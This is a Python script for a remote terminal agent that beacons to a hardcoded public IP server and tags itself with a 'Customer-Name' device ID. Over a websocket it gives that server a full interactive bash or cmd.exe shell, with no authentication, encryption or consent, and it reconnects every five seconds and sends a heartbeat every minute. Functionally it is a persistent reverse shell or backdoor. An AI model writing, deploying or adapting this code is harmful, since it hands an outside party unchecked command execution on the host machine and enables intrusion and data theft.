import asyncio
import websockets
import os
import subprocess
import select
import json
import requests
import time
import threading
import sys
import struct

# Try to import pty and termios (Unix only)
try:
    import pty
    import fcntl
    import termios
    HAS_PTY = True
except ImportError:
    HAS_PTY = False

# Configuration
SERVER_URL = "http://103.200.133.147:8000" # Change to public IP in production
WS_URL = "ws://103.200.133.147:8000/ws/agent"
DEVICE_ID = "Customer-Name"
DEVICE_NAME = "Customer Name"

def heartbeat():
    while True:
        try:
            requests.post(f"{SERVER_URL}/register", json={
                "id": DEVICE_ID,
                "name": DEVICE_NAME
            })
        except Exception as e:
            print(f"Heartbeat failed: {e}")
        time.sleep(60)

async def terminal_handler():
    while True:
        try:
            async with websockets.connect(f"{WS_URL}/{DEVICE_ID}") as websocket:
                print("Connected to server WebSocket")
                
                # Send initial path information
                current_dir = os.getcwd()
                await websocket.send(f"\r\n\x1b[1;34m[*] Working Directory: \x1b[0m\x1b[1;33m{current_dir}\x1b[0m\r\n\r\n")
                
                if HAS_PTY:
                    # Linux/Unix: Real PTY
                    master_fd, slave_fd = pty.openpty()
                    p = subprocess.Popen(["/bin/bash"], stdin=slave_fd, stdout=slave_fd, stderr=slave_fd, start_new_session=True)

                    def set_winsize(fd, row, col, xpixel=0, ypixel=0):
                        win = struct.pack("HHHH", row, col, xpixel, ypixel)
                        fcntl.ioctl(fd, termios.TIOCSWINSZ, win)

                    def pipe_output():
                        while p.poll() is None:
                            r, _, _ = select.select([master_fd], [], [], 0.1)
                            if master_fd in r:
                                try:
                                    data = os.read(master_fd, 1024)
                                    if data:
                                        # Use run_coroutine_threadsafe to send from the pipe thread
                                        asyncio.run_coroutine_threadsafe(websocket.send(data.decode('utf-8', errors='replace')), loop)
                                except EOFError:
                                    break

                    loop = asyncio.get_event_loop()
                    thread = threading.Thread(target=pipe_output, daemon=True)
                    thread.start()

                    try:
                        while p.poll() is None:
                            msg_raw = await websocket.recv()
                            try:
                                msg = json.loads(msg_raw)
                                if msg.get("type") == "input":
                                    os.write(master_fd, msg["data"].encode())
                                elif msg.get("type") == "resize":
                                    set_winsize(master_fd, msg["rows"], msg["cols"])
                            except json.JSONDecodeError:
                                # Fallback for old/simple clients sending raw text
                                os.write(master_fd, msg_raw.encode())
                    except websockets.ConnectionClosed:
                        print("WebSocket closed")
                    finally:
                        os.close(master_fd)
                        os.close(slave_fd)
                        p.terminate()
                else:
                    # Windows/Mock: Simple CMD wrapper (No PTY)
                    print("PTY not available. Using simple subprocess (Windows mock).")
                    p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)

                    def pipe_output():
                        while p.poll() is None:
                            line = p.stdout.read(1) # Read char by char
                            if line:
                                asyncio.run_coroutine_threadsafe(websocket.send(line), loop)

                    loop = asyncio.get_event_loop()
                    thread = threading.Thread(target=pipe_output, daemon=True)
                    thread.start()

                    try:
                        while p.poll() is None:
                            msg_raw = await websocket.recv()
                            try:
                                msg = json.loads(msg_raw)
                                if msg.get("type") == "input":
                                    p.stdin.write(msg["data"])
                                    p.stdin.flush()
                            except json.JSONDecodeError:
                                p.stdin.write(msg_raw)
                                p.stdin.flush()
                    except websockets.ConnectionClosed:
                        print("WebSocket closed")
                    finally:
                        p.terminate()

        except Exception as e:
            print(f"Connection failed: {e}. Retrying in 5s...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    # Start heartbeat in a separate thread
    threading.Thread(target=heartbeat, daemon=True).start()
    
    # Run terminal handler
    asyncio.run(terminal_handler())